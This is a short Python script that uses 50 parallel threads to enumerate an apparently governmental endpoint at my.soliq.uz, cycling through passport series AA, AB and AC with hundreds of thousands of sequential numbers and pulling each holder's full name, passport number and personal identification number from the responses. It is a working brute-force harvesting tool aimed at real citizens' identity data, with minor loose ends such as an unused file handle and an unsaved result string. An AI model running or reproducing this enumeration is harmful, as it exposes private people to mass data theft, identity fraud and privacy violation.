import json
import requests
import concurrent.futures

def getit(id):
	serial = ["AA","AB","AC"]
	outfil = open
	for s in serial:
		out = json.loads(requests.get(url=f"https://my.soliq.uz/partner/pass?passSerya={s}&passNum=0{str(id)}").text)
		try:
			inf = out["data"]["fio"]+";"+s+"0"+str(id)+";"+out["data"]["personalNumber"]
		except:
			pass

with concurrent.futures.ThreadPoolExecutor(max_workers=50) as e:
	[e.submit(getit,i) for i in range(100000,999999,1)]
